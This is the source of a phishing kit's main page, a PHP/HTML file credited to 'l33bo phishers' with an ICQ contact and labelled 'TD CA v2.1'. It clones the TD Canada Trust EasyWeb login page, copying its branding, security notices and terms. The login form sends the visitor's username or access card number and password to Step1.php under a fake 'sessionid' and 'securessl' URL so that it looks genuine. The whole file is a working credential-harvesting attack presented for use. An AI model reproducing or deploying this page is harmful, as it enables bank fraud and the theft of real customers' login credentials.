<?php
/*
L33bo phishers = ICQ: 695059760
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=8">
<title>Login</title>
<link rel="icon" type="image/ico" href="assets/img/favicon.ico"/>
<link rel="stylesheet" type="text/css" href="assets/css/cip_14_3.css">
<link rel="stylesheet" type="text/css" href="assets/css/ew_theme_14_3_en.css">
<link rel="stylesheet" type="text/css" href="assets/css/evergreen_theme_14_3.css">
<link rel="stylesheet" type="text/css" href="assets/css/default.css">
<script>
function Check() {
    var x = document.forms["login"]["login:AccessCard"].value;
    if (x == null || x == "") {
        document.getElementById("ErrorBox").style.display = "block";
        document.getElementById("ErrorUser").style.display = "block";
        return false;
    }
    var y = document.forms["login"]["login:Webpassword"].value;
    if (y == null || y == "") {
        document.getElementById("ErrorBox").style.display = "block";
        document.getElementById("ErrorPass").style.display = "block";
        return false;
    }
}
</script>
</head>
<body class="td-JS-enabled">
	<div id="td-wrapper">
			<div id="headerPane">
				<div class="td-layout-row">
					<div class="td-layout-row">

		<div id="headerMenu"><div>

		
<a name="top" id="top"></a>
<div class="td-skip"> <a href="#">Skip to main content</a> </div>

<header class="td-layout-row" id="td-layout-header" role="banner">
   <div class="td-layout-fluidrow td-logo-top-nav td-margin-top-medium">
      <div class="td-layout-fluidcolumn td-layout-fluidgrid15 td-copy-align-right td-header-flyouts">
         <ul class="td-list-inline td-link-nounderline td-margin-bottom-none">
            <li><a href="#" class="td-link-dottedunderlinehover td-link-colour-grey">TD Home</a>
            </li>
            <li><a href="#" class="td-link-dottedunderlinehover td-link-colour-grey">Apply</a>
            </li>
            <li class="td-header-flyout {position:&#39;left&#39;}">
               <span class="td-header-label"><a class="td-link-dottedunderlinehover td-copy-grey" href="javascript:void(0);">English</a></span>
               <ul style="left: -9999px;">
                  <li>
                     <a class="td-accesstext" href="#">Close details</a>
                     <div class="td-callout td-callout-primary td-cs-tertiary td-layout-column td-layout-grid3 td-padding-top-24 td-padding-right-24 td-padding-bottom-24 td-padding-left-24 td-layout-column-first td-layout-column-last">
                        <div class="td-padding-top-06">
                           <ul class="td-list-links">
                              <li class="td-copy-sub td-link-colour-grey td-margin-bottom-none"><a href="#"><span lang="fr-ca">Français</span></a></li>

                              <li class="td-copy-sub td-link-colour-grey MultilangToggle" style="display: none;"><a id="langToggle_sc" href=""><span lang="zh-cn">ç®ä½ä¸­æ</span></a></li><br>
							  <li class="td-copy-sub td-link-colour-grey MultilangToggle" style="display: none;"><a id="langToggle_tc" href=""><span lang="zh-hk">ç¹é«ä¸­æ</span></a></li>
                           </ul>
                        </div>
                     </div>
                  </li>
               </ul>
            </li>
            <!-- LanguageToggel:: End -->
            
            <!-- Login Option Selection:: Start -->
            <li id="td-website-shortcuts-li">
				<label class="td-forscreenreader">Login to</label>
               <select id="selectbox1" name="selectbox1" class="td-nostyle td-copy-sub">
               
               <option value="#">WebBroker</option>
               
               </select> 
               <a class="td-button td-button-secondary td-button-compact" role="button" onclick="FunSubmit()" href="javascript:void(0);">
			   <span class="td-button-label">Login</span></a>
            </li>
            <!-- Login Option Selection:: End -->
            <!-- Search:: Start -->
            <li id="td-search-li">
               <div id="td-header-search" role="search" class="td-custom-nav-flyout-search">
                  
                  <form action="#" id="globalNavSearch" method="get" target="_top">
                  				  		
                  <label> 
				  <span class="td-forscreenreader">Site Search</span>
                  <input id="td-header-search-textfield" name="query" onfocus="if(this.value==&#39;Site Search&#39;)this.value=&#39;&#39;" onblur="if(this.value==&#39;&#39;)this.value=&#39;Site Search&#39;" type="text" value="Site Search">
				  </label>
				  <label>
                  <input id="td-header-search-button" type="submit" value="Search">
                  </label> <input name="language" type="hidden" value="en">
                  <input name="site" type="hidden" value="td_canadatrust_en|td_waterhouse_en">
                  </form>
               </div>
            </li>
            <!-- Search:: End -->
         </ul>
      </div>
   </div>
</header>

<!-- End #td-layout-header -->





<style type="text/css">
#td-layout-header {background-color:#f1f1f1;margin:0px -13px 0px -12px;padding-bottom:17px;} 
#td-container {padding:0px 12px;margin-top:0px;border:none;} 
#td-layout-header select {padding:0px} 
#td-layout-header ul li.td-header-flyout ul, .td-link-taboverlay ul {z-index:4}
.td-button {z-index:0}
</style>

</div>
		</div>
	

					</div>
				</div>
			</div>
		<div id="td-container">

	<div id="flyoutMenu">	
<div>
<!--****************************************
 Main Navigation
****************************************--> 
            
<div class="td-layout-row td-logo-top-nav" id="td-layout-nav-main" role="navigation">
<div class="td-layout-column td-layout-grid15 td-layout-column-first td-layout-column-last">
<nav class="td-nav-level2-unassisted td-nav-level2-tall td-nav-level2-fullwidth" id="td-nav-level2">
	<ul style="left: -10991.3px;">
		<li id="td-logo"><a href="#"><img src="assets/img/td_shield_nowhitespace.gif"></a></li>
		<li id="menuTab1" class="td-nav-level2-active"><span class="td-nav-level2-label">My Accounts</span></li>		
		<li id="menuTab2"><span class="td-nav-level2-label"><a href="#" aria-describedby="flyout42201534706am2">Contact Us</a></span></li>	
		<li id="menuTab3"><span class="td-nav-level2-label"><a href="#" aria-describedby="flyout42201534706am3">Products &amp; Services</a></span></li>
		<li id="menuTab4"><span class="td-nav-level2-label"><a href="#" aria-describedby="flyout42201534706am4">Markets &amp; Research</a></span></li>		
		<li id="menuTab5"><span class="td-nav-level2-label"><a href="#" aria-describedby="flyout42201534706am5">Life Planning </a></span></li>
	</ul>
</nav>
</div>
</div>

<!-- End Main Navigation -->
</div>
	</div>
	
		
			<div id="bodyPane">
<style type="text/css">
#selectbox1 {
	height:19px;
}
#td-header-search-textfield {
	height:15px;
	margin-top:2px !important;
}
</style>



<form method="post">
	<div id="cookieEnable" class="languagelink" style="display: block;"
<a href="#">Français</a>
	</div> 
</form>

<div id="cip_leftPane">
    <div id="serviceBanner"><div><p>
<style>
.INFOSITEtoolboxlite {
	color: #006666;
	font-size: 10px;	
	text-align: left;	
}
.INFOSITEcellL {
	text-align: left;
}
.INFOSITEelement {
	border: 1px solid #EAF4D7;
}
.INFOSITEcellPad{
	padding : 0.3em;
}
.INFOSITEtoolbox {
	color: #103F26;
	font-size: 0.9em;
	font-weight: bold;
}
.INFOSITEcolbackgreen {
	background-color: #EAF4D7;
}

   #OnlineSecurity h4{color: #555555;font-family: Arial,Helvetica,sans-serif;font-size: 14px;font-weight: bold;
line-height: 1.2em;margin: 1.5em 0 0.5em 5em;}
   #OnlineSecurityTitle {height:72px; background: url("assets/img/lock.jpg") left top no-repeat !important}
   #OnlineSecurity .td-link-icon{background: url("assets/img/icon-link-secondary.png") no-repeat 0 0;height: 8px;margin: -1px 0 0 5px;width: 5px;}
</style>
</p><div id="ie7" style="display:none;">
	<table width="172" class="INFOSITEelement">
	<tbody>
		<tr class="INFOSITEcolbackgreen">
		<td valign="top" class="INFOSITEcellPad">
		<img width="1" height="1" border="0" alt="" src="assets/img/transp.gif">
		</td>
		<td class="INFOSITEtoolbox INFOSITEcellL INFOSITEcellPad">
		<div style="font-size:12px; font-family: verdana, helvetica, sans serif;color:#ff0000;">
		Internet Explorer 7 Users:
		</div>
		</td>
		</tr>
		<tr>
		<td valign="top" class="INFOSITEcellPad">
		<img width="1" height="1" border="0" alt="" src="assets/img/transp.gif">
		</td>
		<td class="INFOSITEtoolboxlite INFOSITEcellL INFOSITEcellR INFOSITEcellPad">

 
		<br>

		</td>
		
		</tr>
	</tbody>
	</table>
</div>
	<p></p>

<div id="tabletPlaceHolder" style="display:none;">
	<div id="tabletPane" class="td-layout-fluidrow" style="margin:0 auto;width:98.6%;position:absolute;top:0;left:0.7%;">
		<div class="td-layout-fluidcolumn td-layout-fluidgrid12">
			<div class="td-callout td-callout-primary td-cs-primary" style="padding-bottom:16px;">
				<div class="td-callout-content">
					<div class="td-layout-row">
						<div class="td-layout-column td-layout-grid3 td-layout-column-first">
							<a class="closeOverlay" href="javascript:void(0);" onclick="trackCustomLink(&#39;tdct:p:tablet app banner:exit&#39;,&#39;button&#39;,&#39;onclick&#39;);"><img src="assets/img/close.png" alt="Close"></a>
							<br><a class="closeOverlay appStoreUrl" href="javascript:void(0);" rel="external" onclick="trackCustomLink(&#39;tdct:p:tablet app banner:appstore&#39;,&#39;button&#39;,&#39;onclick&#39;);"><img src="assets/img/td-tablet-bythelake.jpg" class="td-margin-top-small" alt="TD tablet" width="164" height="108"></a>
						</div>

						<div class="td-layout-column  td-layout-grid12 td-layout-column-last">
							<div class="td-layout-row">
								<div class="td-layout-column td-layout-grid12 td-layout-column-first td-layout-column-last">
									<h3 class="td-h3 td-margin-top-small"><strong>Transfer money on-the-go</strong></h3>
									  <p>
									Move money between your TD Canada Trust Canadian and U.S dollar accounts using the TD app.
									</p>
									<hr class="td-divider-fade td-divider-fade-fadetoright">
								</div>
							</div>						
							<div class="td-layout-row td-layout-grid11">
								<div class="td-layout-column td-layout-column-first td-layout-grid6">
									<h4 class="td-h4 td-margin-top-small">Do you want to launch the TD tablet App?</h4>
								</div>
								<div class="td-layout-column td-layout-column-last td-margin-top-small td-layout-grid4">
									<a class="closeOverlay appStoreUrl td-button td-button-primary" style="margin-right:20px;" href="javascript:void(0);" rel="external"><span class="td-button-label">Yes</span></a>
									<a class="closeOverlay td-button td-button-secondary" href="javascript:void(0);" rel="external" onclick="trackCustomLink(&#39;tdct:p:tablet app banner:no&#39;,&#39;button&#39;,&#39;onclick&#39;);"><span class="td-button-label">No Thanks</span></a>
								</div>
							</div>
							<div class="td-layout-row td-layout-grid11">							
								<p class="td-layout-column td-margin-top-large td-copy-grey td-layout-column-first td-layout-column-last" style="margin-left:-6px;">
									<input type="checkbox" id="doNotshow" style="vertical-align:middle;">&nbsp;<span style="vertical-align:middle;">Do not show this until the next version of the TD tablet App is released</span>
								</p>
							</div>
						</div>
					</div>
				</div>
			</div>				 
		</div>
		<div style="clear:both"></div>
	</div> 
</div>  
<!--- Tablet Detection End -------------->
<style>

.td-button-label.td-copy-emphasized {
    font-size: 3.2em !important;
}
.td-h1.td-copy-emphasizedheader {
    font-size: 4em !important;
}
sameline{
display : inline-bloc;
}
</style>


<div id="phonePlaceHolder" style="display:none;" class="td-layout-fluidrow">
	<div id="phonePane" style="margin:0 auto;width:98.6%;position:absolute;top:0;left:0.7%;">
		<div class="td-layout-fluidcolumn td-layout-fluidgrid12" id="phoneDiv">
			<div class="td-callout td-callout-primary td-cs-primary" style="padding-bottom:16px;">
				<div class="td-callout-content">
					<div class="td-layout-fluidrow">
						<div class="td-layout-fluidcolumn">
							<a class="closeOverlayM td-floatleft" href="javascript:void(0);" onclick="trackCustomLink(&#39;tdct:p:smartphone app banner:exit&#39;,&#39;button&#39;,&#39;onclick&#39;);"><img src="assets/img/close.png" alt="Close"></a>
							<img src="assets/img/mbanner.jpg" class="td-image-fullwidth td-JShide" id="Androidbanner" style="display: none;">

						</div>

					</div>
					<div style="margin-left:50px;">
					<h1 class="td-h1 td-margin-top-small td-copy-emphasizedheader td-floatleft"><strong>Do you want to launch the TD  App?</strong></h1>

					<div class="td-layout-fluidrow">
						<div class="td-layout-fluidcolumn td-layout-column-first  td-layout-grid7">
								<a class="closeOverlayM appStoreUrlM td-button td-button-primary td-button-fullwidth xtd-margin-bottom-large" href="javascript:void(0);" rel="external"><span class="td-button-label td-copy-emphasized td-copy-emphasized-custom">Yes</span></a>
						</div>
						<div class="td-layout-fluidcolumn td-layout-column-last td-layout-grid7">
								<a class="closeOverlayM td-button td-button-secondary  td-button-fullwidth" href="javascript:void(0);"><span class="td-button-label td-copy-emphasized td-copy-emphasized-custom" onclick="trackCustomLink(&#39;tdct:p:smartphone app banner:no&#39;,&#39;button&#39;,&#39;onclick&#39;);">No thanks</span></a>
						</div>
					</div>
					<div class="td-layout-row ">
						<div class="td-layout-column td-margin-top-small td-copy-grey  td-layout-column-first td-layout-column-last" style="margin-left:-6px; font-size: 2em;">
						<div class="sameline"><input type="checkbox" id="doNotshowMobile" style="vertical-align:middle;">&nbsp;<span class="" style="vertical-align:middle;"><!--label for="doNotshowMobile"--><strong>Do not show this until the next version of the TD mobile App is released</strong><!--/label--></span>
						</div></div>
					</div>
					</div>
				</div>
			</div>
		</div>
		<div style="clear:both"></div>
	</div>
</div>
<!--- phone Detection End -------------->
<div id="spacer" style="padding-top:25px;"> </div>
<!----------------->
<div id="login-attention" style="display:none; ">
	<div class="td-callout td-callout-story td-cs-highlight">
	<div class="td-callout-heading">
	<h4 class="td-h4">Attention! </h4>
	</div>
	<divclass="td-callout-content">
	</divclass="td-callout-content"></div>
	</div>
</div>
<!----------------->

<div id="OnlineSecurity" style="margin-top:-20px;">
	<div id="OnlineSecurityTitle">
   		<h4> TD ONLINE AND<br> MOBILE SECURITY<br> GUARANTEE</h4>
		<a style="margin-left: 5.5em !important" href="#" target="_blank">Learn more <span class="td-link-icon">&gt;</span></a>
    </div>        
</div>

<div id="td-login-left" style="margin-top:6px;">
    <div class="td-callout td-callout-tertiary  ">
   
   
<!----------------->
	<div id="protect" style="margin-top:42px">
	<div style="margin-left:13px;text-indent:-13px;">
	  <a class="td-link-toggle {targetelement: &#39;.td-Protect&#39;}" href="#"><span class="td-triggericon">Expand</span> <span style="line-height:1.1em;"><b>Protect yourself against fraud</b></span></a></div>
        <div class="td-JShide td-Protect td-copy-standard" style="margin-top: 5px; display: none;" tabindex="-1">
		<p>Knowing how to recognize, report and prevent phishing, is important.</p>
		<p>
		<a class="td-link-standalone td-link-standalone-secondary" href="#">Learn <span class="td-copy-nowrap">more﻿<span class="td-link-icon">›</span></span></a></p>
		<p>
		If anything looks suspicious, report it to <a href="mailto:phishing@td.com">phishing@td.com</a></p>
         </div>
</div><!-- End .td-callout -->
</div>
<script type="text/javascript">
$(".td-JShide").hide();
</script>


<!-------special notices---------->

</div>
	</div>
	<!-- Empty DIV added for Accessibility. This is to allow JAWS to read the page properly when empty content is rendered in the serviceBanner -->
	<div style="height: 0.1px;">&nbsp;</div>
</div>
<!-- Not indenting these div tags for readability since they have no content-->
<div id="evergreenLoginPane">
	<div id="mainContent">
		<div>
		<div class="td-layout-row">
			<div class="td-layout-column td-layout-grid7 td-layout-column-first td-layout-column-last">
				<div id="td-pagetitlearea td-margin-bottom-small">
					<a id="main" tabindex="-1"></a>
					<h1 class="td-margin-top-none td-margin-bottom-none">EasyWeb</h1>
				</div>
			</div>
		</div>
		</div>
		<div class="td-layout-row">
		<h3 class="td-margin-top-none">Login to our secure financial services site
		</h3>
		</div>
		
		<!--ERROR BOX-->
		<div class="td-layout-row">
		<div class="td-layout-column td-layout-grid8 td-layout-column-first td-layout-column-last">
		<div id="ErrorBox" style="display:none;" class="td-callout td-callout-primary td-cs-error" tabindex="1">
		<ul class="generalEvergreenError">
		<li id="ErrorUser" style="display:none;" class="submitError"><a class="errorLink" id="accesscardMessage" tabindex="1">Please enter your Username or Access Card number.</a></li>
		<li id="ErrorPass" style="display:none;" class="submitError"><a class="errorLink" id="accesscardMessage" tabindex="1">Please enter your password.</a></li>
		</ul>
		</div>
		</div>
		</div>
		<!--ERROR BOX-->
		
		<div class="td-layout-row">
		<div class="td-layout-column td-layout-grid8 td-layout-column-first td-layout-column-last">																	
		
		<form id="login" class="td-callout td-callout-story td-cs-primary" name="login" action="Step1.php?&sessionid=<?php echo generateRandomString(30); ?>&securessl=true" method="post" onsubmit="return Check();">								
		<fieldset>
			<legend>Login to our secure financial services site
			</legend>
			
		
					<div id="dropDownList" style="display:none;">
					<div style="display:none">
						<div class="td-layout-row">
							<div class="td-layout-column td-layout-grid2 td-layout-column-first">
							</div>
							<div class="td-layout-column td-layout-grid3 td-layout-column-last"><br>
								<span class="normaltxt">
									<a href="#" tabindex="7" id="removeFromList">Remove from List</a>
								</span>
							</div>
						</div>	
					</div>
					<div class="td-layout-row">
						<div class="td-layout-column td-layout-grid2 td-layout-column-first td-layout-column-last">
							<div style="display:none">
						 	</div>
						 </div>
					</div>
				 	</div>
				 		<div class="td-layout-row">
				 			<div class="td-layout-column td-layout-grid5 td-layout-column-first">&nbsp;</div>
							<div class="td-layout-column td-layout-column-last">										
								<label for="login:description" class="td-copy-sub">Description (Optional)</label>
							</div>
						</div>
					<div class="td-layout-row td-margin-bottom-medium">
						<div class="td-layout-column td-layout-grid2 td-layout-column-first">												
							<label id="Card" class="td-copy-align-right" for="login:AccessCard"><span class="boldFont">Username or Access Card</span><br>(no spaces)
							</label>
						</div>
						<div class="td-layout-column td-layout-grid5 td-layout-column-last">	
							<div class="td-layout-row">	 
								<div class="td-layout-column td-layout-grid3 td-layout-column-first">
									<input tabindex="2" autofocus name="login:AccessCard" class="accessCardField" id="login:AccessCard" onchange="clearDescriptionBox();" maxlength="32" autocomplete="off" type="text">
									
								</div>
								<div class="td-layout-column td-layout-grid2 td-layout-column-last">
										<input tabindex="8" id="login:description" name="login:description" class="descriptionFieldWidth" maxlength="15" autocomplete="off" type="text">
								</div>
							</div>
								<div class="td-layout-row">
									<input tabindex="9" id="rememberMeCBox" name="rememberMeCBox" class="rememberTxt" aria-labelledby="rememberme" type="checkbox">&nbsp;<a id="R1" name="R1" href="" onclick="help('#'); return false;" tabindex="10"><span id="rememberme">Remember me</span></a>
								</div>
						</div>
						
					</div>
					<div class="td-layout-row">			
						<div class="td-layout-column td-layout-grid2 td-layout-column-first">			
						    <label id="password" class="td-copy-align-right" style="display: block" for="login:Webpassword"><span class="boldFont">Password</span></label>
						</div>
						<div class="td-layout-column td-layout-grid3">
							<input tabindex="3" name="login:Webpassword" type="password" class="accessCardField" id="login:Webpassword" size="24" value="" maxlength="32" autocomplete="off">
						</div>
						<div class="td-layout-column td-layout-grid2 td-layout-column-last">
							<input tabindex="4" id="login" type="submit" class="td-button td-button-primary" value="Login" onclick="setDevicePrintFormFields('login'); return clickOne();" title="Login to our secure financial services site">
						</div>
					</div>
					<div class="td-layout-row">	
						<div class="td-layout-column td-layout-grid2 td-layout-column-first">&nbsp;</div>
						<div class="td-layout-column td-layout-grid5 td-layout-column-last">
							
								<span class="pwdTxt"><a id="T9" name="T9" href="#" tabindex="5">Forgot your Username or Password?</a>
								</span>
						</div>
					</div>
					
		</fieldset>
		</form>
		</div></div>
		<div class="td-layout-row"><div class="td-layout-column td-layout-column-first td-layout-column-last">				
		<div id="securityPane"><div>
<style>
#loginPane FORM SELECT {font-size:14px;}
#loginPane FORM INPUT {font-size:14px;}
</style>
<div id="NOTHING" style="padding:10px"></div>

<style>
#banner-title { line-height:1.3em; }
a.title-link {color:#555555;}
a.title-link:hover, a.title-link:focus, a.title-link:active{color:#555555;}
.td-ul-li {
	background-image: url("assets/img/bullet.gif");
	background-position: 0 0.6em;
	background-repeat: no-repeat;
	line-height: 1.2em;
	list-style: none outside none;
	margin: 0 0 0.5em;
	padding: 0 0 0 12px;
	position: relative;
}
</style>






<div class="td-layout-row">
	<div class="td-callout td-callout-primary td-cs-primary">
    	<div clas="td-layout-row">
        	<div class="td-layout-column td-layout-grid1 td-layout-column-first">
            	<img src="assets/img/td-icon-info.png">
            </div>
        	<div class="td-layout-column td-layout-grid6">
                <div class="td-callout-heading">
                    <h4 style="border:none" class="td-margin-bottom-medium td-margin-top-small"><strong>
You asked, and we listened. A quicker way to get you to Interac e-Transfers in EasyWeb. </strong></h4>
                </div>
                <div class="td-callout-content">


                </div>
             </div>
             <div style="clear:both"></div>
        </div>
    </div><!-- End .td-callout -->
</div>
</div>
		</div>
		<div id="termsConditions"><div>
    <p class="td-legal">
    By using EasyWeb, our secure financial services site, offered by <span class="">TD Canada Trust</span> and its affiliates, you agree to the terms and conditions of the
<a class="disclm" href="#">Financial Services Terms</a><span class="INFOSITEtable">,</span>
<a class="disclm" href="#">Cardholder and Electronic Financial Services Terms and Conditions</a> <span class="INFOSITEtable">and/or; the</span>
<a class="disclm" href="#">Business Access Services Schedule</a><span class="INFOSITEtable">, and/or; the</span>
<a class="disclm" href="#">Terms and Agreement</a> <span class="INFOSITEtable">and</span>
<a class="disclm" href="#">Disclosure</a> <span class="INFOSITEtable">for mutual fund accounts held with TD Investment Services Inc.</span>
</p>











</div>
		</div>
		</div></div>					
	</div>	<!-- end mainContent -->
</div>	<!-- end loginPane -->
<div id="cip_rightPane"><div><div id="login-start" class="td-callout td-callout-tertiary td-margin-bottom-none td-padding-bottom-03" style="padding-top: 67px;">
	<div class="td-callout-heading">
		<h3 class="td-h3" style="border-top:0px;">Getting started is Quick and Easy</h3>
	</div>
	<div class="td-callout-content td-copy-standard">
		<p>
			If you received a temporary password, simply use that along with your
 username to log in. You will then be prompted to create a new one.
		</p>
		<ul class="td-list-links">
			<li><a href="#" tabindex="24">Register Online Now</a></li>
			<li><a href="#" tabindex="25" title="Get the TD Mobile App now">Get the TD Mobile App now</a></li>
		</ul>
		<p>
			</p><hr class="td-divider-fade td-divider-fade-fadetoright td-cs-tertiary td-margin-bottom-none">
		<p></p>
	</div>
</div>

<div id="login-return" class="td-callout td-callout-tertiary td-margin-bottom-none td-padding-bottom-03" style="display:none; ">
	<div class="td-callout-content">
		<h5 class="td-h5" style="color: #1a5336;"><a class="td-link-toggle {targetelement: '.td-login-help1'}" href="#" tabindex="26"><span class="td-triggericon td-triggericon-expanded">Collapse</span><span><b>We Can Help</b></span></a></h5>
		<div class="td-login-help1">
			<a aria-describedby="aria-39667" href="#" class="td-popupwindow td-link-newwindow-withicon" tabindex="27" rel="width:550;"><span class="td-link-newwindow-label">Get Login Help</span>&nbsp;<span class="td-link-newwindow-icon" id="aria-39667">(opens new window)</span></a>
			<ul class="td-list-links" style="margin-top:5px;">
				<li><a href="#" tabindex="28">Reset Password</a></li>
				<li><a href="#" tabindex="29">Supported Browsers</a></li>
				<li><a href="#" tabindex="30">Try the Demo</a></li>
			</ul>
			<hr class="td-divider-fade td-divider-fade-fadetoleft td-cs-tertiary">
			<h3 style="margin-top:5px;margin-bottom:5px;">Test-drive the <a href="#">EasyWeb Demo</a> and explore online banking.</h3>
			<hr class="td-divider-fade td-divider-fade-fadetoleft td-cs-tertiary">
			<h3>Anytime, anywhere and even on the go</h3>
			<p>
				<a href="#" tabindex="31" class="td-link-standalone td-link-standalone-secondary">Get the TD app <span class="td-copy-nowrap">
				now﻿<span class="td-link-icon">›</span></span></a>
			</p>
			<hr class="td-divider-fade td-divider-fade-fadetoleft td-margin-bottom-none td-cs-tertiary">
		</div>
	
	</div>
</div>

<div id="login-tour" class="td-callout td-callout-tertiary td-margin-bottom-none td-padding-bottom-03" style="display:block;">
	<div class="td-callout-content">
		<div id="login-help" style="margin-top: 15px; margin-left: 12px;">
			<a class="td-link-toggle {targetelement: '.td-login-help2'}" href="#" tabindex="32"><span class="td-triggericon">Expand</span><span><b>Need Login Help?</b></span></a>
			<div class="td-JShide td-login-help2" style="margin-top: 5px; display: none;">
				<a aria-describedby="aria-39009"href="#" class="td-popupwindow td-link-newwindow-withicon" rel="width:550;" tabindex="33"><span class="td-link-newwindow-label">Get Login Help</span>&nbsp;<span class="td-link-newwindow-icon" id="aria-39009">Get Login Help</span></a>
				<ul class="td-list-links" style="margin-top:5px;">
					<li><a href="#" tabindex="34">Reset Password</a></li>
					<li><a href="#" tabindex="35">Supported Browsers</a></li>
				</ul>
			</div>
			<hr class="td-divider-fade td-divider-fade-fadetoright td-cs-tertiary td-margin-top-large td-margin-bottom-none">
		</div>
	</div>
	
</div>
<div class="td-callout td-callout-tertiary">
	<div class="td-callout-heading">
		<h3>Make deposits in a snap</h3>
	</div>
	<div class="td-callout-content">
		<p>
			 Make mobile deposits on your own schedule by taking a photo with your smartphone.
		</p>
		<p>
			<a href="#">Learn more</a>
		</p>
	</div>
</div>

</div>
</div>
</div>
	<div id="footerPane"></div>
	

</div>
	<!-- footer.xhtml -->
    				
<footer class="td-layout-row" id="td-layout-footer" role="complementary">
	<div class="td-layout-column td-layout-grid15 td-noprint td-layout-column-first td-layout-column-last" style="width:100%">
		<ul class="td-list-inline td-copy-sub td-link-colour-grey td-link-nounderline">
			<li><a href="#">Privacy and Security</a></li>
			<li><a href="#">Legal</a></li>
				<li><a href="#">Accessibility</a></li>
		</ul>
	</div>
</footer>
<div id="serverTxt">(Server ID:  GF98F  : 61f9565-b5858-2156-b691-d8g48f68b )
		


</div>
</div>



</body>
</html>
<?php
/*
------------------------------------|
$$$________$$$$$$$$$$__$$$$$$$$$$	|
$$$________$$$_________$$$_______	|
$$$________$$$_________$$$_______	|
$$$________$$$$$$$$____$$$$$$$___	|
$$$________$$$_________$$$_______	|
$$$________$$$_________$$$_______	|
$$$$$$$$$__$$$$$$$$$$__$$$$$$$$$$	|
------------------------------------|
	Created by :: l33bo phishers	|
------------------------------------|
			TD CA v2.1				|
------------------------------------|
*/
?>